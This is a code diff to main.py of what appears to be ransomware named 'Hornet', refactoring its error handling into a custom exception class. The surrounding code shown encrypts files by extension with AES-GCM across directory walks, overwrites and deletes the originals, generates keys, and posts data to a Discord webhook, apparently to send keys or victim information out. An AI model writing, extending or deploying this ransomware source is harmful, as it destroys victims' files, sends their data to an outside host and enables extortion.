@@ -1,10 +1,15 @@
+# main.py
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite
 
 from typing import List
+from rich.console import Console
+from exceptions import HornetRansomwareException
 import requests
 import secrets
-import base64
 import os
+
+# For rich and detailed error or information messages
+console = Console()
 
 def send_data(data: str) -> bool:
     """
@@ -21,13 +26,18 @@ def send_data(data: str) -> bool:
 
     try:
         response = requests.post(webhook_url, json=payload)
-        response.raise_for_status()
         if response.status_code != 204:
-            raise requests.exceptions.RequestException(f"Received status code {response.status_code} from Discord, expected 204.")
+            raise HornetRansomwareException(
+                message = "Failed to send data to the server.",
+                context = {
+                    "status_code": response.status_code,
+                    "response": response.text
+                }
+            )
         return True
-    except requests.exceptions.RequestException as e:
-        print(f"An error occurred: {e}")
+    except HornetRansomwareException as _:
         return False
+
 
 def encrypt_file(filepath: str, key: bytes) -> None:
     """
@@ -50,7 +60,13 @@ def encrypt_file(filepath: str, key: bytes) -> None:
             file.write(nonce + ciphertext)
         print(f"Successfully encrypted {filepath} to {encrypted_filepath}.")
     except Exception as e:
-        print(f"An error occurred while encrypting {filepath}: {e}")
+        raise HornetRansomwareException(
+                message = f"An error occurred while encrypting {filepath}: {e}",
+                context = {
+                    "filepath": filepath,
+                    "key": key
+                }
+        )
 
 def wipe_file(filepath: str) -> None:
     """
@@ -67,7 +83,12 @@ def wipe_file(filepath: str) -> None:
         os.remove(filepath)
         print(f"Successfully wiped {filepath}.")
     except Exception as e:
-        print(f"An error occurred while wiping {filepath}: {e}")
+        raise HornetRansomwareException(
+            message = f"An error occurred while wiping {filepath}: {e}",
+            context = {
+                "filepath": filepath,
+            }
+        )
 
 def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) -> None:
     """
@@ -90,9 +111,21 @@ def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) ->
                     encrypt_file(filepath, key) 
                     wipe_file(filepath)
     except os.error as e:
-        print(f"An error occurred while walking through {directory}: {e}")
+        raise HornetRansomwareException(
+                message = f"An error occurred while walking through the directory: {e}",
+                context = {
+                    "directory": directory,
+                    "key": key
+                }
+        )
     except Exception as e:
-        print(f"An error occurred: {e}")
+        raise HornetRansomwareException(
+                message = f"A general and unclassified error occurred while encrypting the directory: {e}",
+                context = {
+                    "directory": directory,
+                    "key": key
+                }
+        )
 
 def generate_key() -> bytes:
     """
